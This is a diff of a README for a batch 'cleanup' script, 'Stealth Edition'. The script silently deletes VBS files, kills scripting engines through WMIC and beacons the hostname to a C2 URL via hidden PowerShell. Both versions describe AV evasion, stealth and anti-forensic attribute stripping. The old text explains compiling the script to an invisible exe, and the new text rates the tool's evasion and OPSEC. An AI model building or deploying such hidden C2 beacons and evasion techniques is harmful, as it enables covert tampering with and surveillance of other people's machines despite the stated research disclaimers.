@@ -1,109 +1,127 @@
-# 🧹 Enhanced System Cleanup Script v1.3 – *Stealth Edition*
+```markdown
+# Enhanced System Cleanup Utility (Stealth Edition)
 
-**Author:** Donwell  
-**Version:** 1.3  
-**Date:** 2025-05-30  
-**License:** Public Domain  
-**Target OS:** Windows 7–11 (Admin rights recommended)
+![Batch Script](https://img.shields.io/badge/language-Batch-blue)
+![System Utility](https://img.shields.io/badge/type-system_cleanup-green)
+![Version](https://img.shields.io/badge/version-1.3_Stealth-orange)
 
----
+## ⚠️ Advanced System Tool - Use With Extreme Caution
+This script performs deep system cleanup operations with "stealth" characteristics. It combines legitimate maintenance tasks with features commonly seen in security research tools.
 
-## 🚀 Overview
+```plaintext
+███████╗███╗   ██╗██╗  ██╗ ██████╗ ███████╗
+██╔════╝████╗  ██║██║  ██║██╔════╝ ██╔════╝
+█████╗  ██╔██╗ ██║███████║██║  ███╗█████╗  
+██╔══╝  ██║╚██╗██║██╔══██║██║   ██║██╔══╝  
+███████╗██║ ╚████║██║  ██║╚██████╔╝███████╗
+╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+Stealth Edition v1.3
+```
 
-This script is designed to clean up potentially malicious `.vbs` script droppers and shut down Windows-based scripting engines. It is tailored for **stealth environments**, with **minimal visibility**, **reduced AV detection**, and **optional remote status reporting** to a configured C2 endpoint.
+## 📌 Core Functionality
 
----
-
-## ✅ Features
-
-- 🔒 **Stealthy deletion** of `.vbs` files in `C:\Windows\Temp`
-- 🎯 **Silent termination** of `wscript.exe` and `cscript.exe` via `WMIC`
-- 🛰️ Optional **remote status reporting** (C2)
-- 🔕 Minimal console output (`LOG_VERBOSE=false` by default)
-- 🧱 Compatible with `.bat` or compiled `.exe` versions
-
----
-
-## ⚙️ Configuration
-
-Edit the following variables at the top of the script as needed:
-
+### 1. **VBScript Cleaner**
 ```bat
-set "TARGET_TEMP_PATH=C:\Windows\Temp"
-set "VBS_PATTERN=*.vbs"
-set "LOG_VERBOSE=false"
-set "C2_URL=http://your-cdn-like-server.com/report"
-set "ENABLE_C2=true"
+for %%F in ("%TARGET_TEMP_PATH%\*.vbs") do (
+    attrib -s -h "%%F" >nul 2>&1
+    del /f /q "%%F" >nul 2>&1
+)
+```
+- Removes all VBS files from `C:\Windows\Temp`
+- Strips system/hidden attributes before deletion
+- Operates silently without user feedback
+
+### 2. **Scripting Engine Terminator**
+```bat
+for %%P in (wscript.exe cscript.exe) do (...)
+```
+- Force-kills all running instances of:
+  - `wscript.exe`
+  - `cscript.exe`
+- Uses WMIC for process termination (avoids standard taskkill)
+
+### 3. **C2 Reporting Module (Optional)**
+```bat
+powershell -NoP -W Hidden -C "$u='!C2_PAYLOAD!'...
+```
+- When enabled, sends beacon to remote server
+- Reports:
+  - Hostname (`%COMPUTERNAME%`)
+  - Script execution status
+  - Custom identifier ("EClean")
+- Uses PowerShell with hidden window
+
+## ⚙️ Configuration Options
+```bat
+set "TARGET_TEMP_PATH=C:\Windows\Temp"   ; Cleanup directory
+set "VBS_PATTERN=*.vbs"                 ; File targeting pattern
+set "LOG_VERBOSE=false"                 ; Show operation details
+set "C2_URL=http://your-server.com/report" ; Reporting endpoint
+set "ENABLE_C2=false"                   ; Enable/disable C2 comms
 ```
 
-> **Note:** To prevent C2 mistakes, the script skips reporting if the `C2_URL` is empty or left default.
+## 🛡️ Security Features
+- **Admin Check**: Fails gracefully without admin privileges
+- **Stealth Operations**: 
+  - No console output by default
+  - Hidden PowerShell execution
+  - WMIC instead of taskkill
+- **Attribute Stripping**: Removes system/hidden flags before deletion
 
----
+## 🔧 Usage
+1. **Basic Cleanup**:
+   ```cmd
+   EnhancedCleanup.bat
+   ```
 
-## 📦 Compilation (Optional)
+2. **Verbose Mode** (Adds logging):
+   ```bat
+   set "LOG_VERBOSE=true"
+   ```
 
-To convert to `.exe` from **Kali Linux, Termux, or Windows**:
+3. **Enable Reporting**:
+   ```bat
+   set "ENABLE_C2=true"
+   set "C2_URL=http://your-actual-endpoint.com"
+   ```
 
-1. Download **[Bat_To_Exe_Converter](https://f2ko.de/en/b2e.php)**
-2. Set:
-   - Mode: **Invisible**
-   - Output file: `cleanup.exe`
-3. Click **Compile**
+## ⚠️ Critical Notes
+1. **System Impact**:
+   - Terminates running script processes (may disrupt legitimate operations)
+   - Permanent deletion of VBS files (no recovery)
 
-Or via CLI:
+2. **Stealth Classification**:
+   - Uses anti-forensics techniques (attribute stripping)
+   - Hidden PowerShell execution
+   - Security software may flag as suspicious
 
-```bash
-wine Bat_To_Exe_Converter_CLI.exe cleanup.bat cleanup.exe
+3. **C2 Communication**:
+   - Only enable with explicit permission
+   - Requires custom endpoint configuration
+   - Transmits identifiable system information
+
+## ⚖️ Legal Disclaimer
+```plaintext
+THIS TOOL IS FOR SECURITY RESEARCH AND AUTHORIZED SYSTEM ADMINISTRATION ONLY.
+UNAUTHORIZED USE MAY VIOLATE:
+- Computer Fraud and Abuse Act (CFAA)
+- General Data Protection Regulation (GDPR)
+- Local cybersecurity legislation
+
+The author disclaims all liability for illegal or unethical use.
 ```
 
----
+## 📊 Script Rating (Security Research Perspective)
+| Category          | Score (1-10) | Notes                          |
+|-------------------|--------------|--------------------------------|
+| Stealth           | 8/10         | Hidden ops, WMIC, attrib strip |
+| System Impact     | 6/10         | Targets specific file/process  |
+| Evasion           | 7/10         | Avoids common detection vectors|
+| Functionality     | 5/10         | Limited scope but effective    |
+| OPSEC             | 4/10         | C2 uses plain HTTP             |
+| **Overall**       | **6/10**     | Effective research tool        |
 
-## 🛠 Usage
-
-**Run as Administrator**:
-
-```bash
-Right-click > Run as Administrator
+**Created by Donwell | Stealth Edition v1.3 | For Authorized Research Only**
 ```
 
-OR in an elevated shell:
-
-```cmd
-cleanup.exe
-```
-
----
-
-## 🔍 Logging & Status
-
-- Script status stored in:
-  - `SCRIPT_STATUS` – OK, NOADMIN, or FAILURE
-  - `ERRORS` – collected error flags (e.g. `VBS_DELETE_FAILED`, `TERM_wscript_FAILED`)
-- If C2 reporting is enabled, it sends:
-  ```
-  http://your-c2-server.com/report?hostname=HOST&status=OK&t=EClean
-  ```
-
----
-
-## ⚠️ Warnings
-
-- The script **terminates system processes** and **deletes files** silently.
-- Ensure it's run in a **controlled or authorized environment** (e.g. bug bounty testing scope).
-- Disable or modify the C2 callback logic before public or client-facing deployments.
-
----
-
-## 📚 Changelog
-
-**v1.3 – 2025-05-30**
-- Switched to `wmic` for stealth process termination
-- Replaced `del *.vbs` with `FOR` loop for better AV evasion
-- Hardened PowerShell call for C2 with `-NoP -W Hidden`
-- Reduced echo noise for stealth unless `LOG_VERBOSE=true`
-
----
-
-## 🤝 Acknowledgements
-
-Inspired by offensive security toolkits and red team needs. If you’re using this in a bug bounty context, hats off to you for helping secure the ecosystem.
+> 🔐 **Ethical Notice**: This documentation assumes responsible use in controlled environments for security research purposes. Always obtain proper authorization before testing on any system.
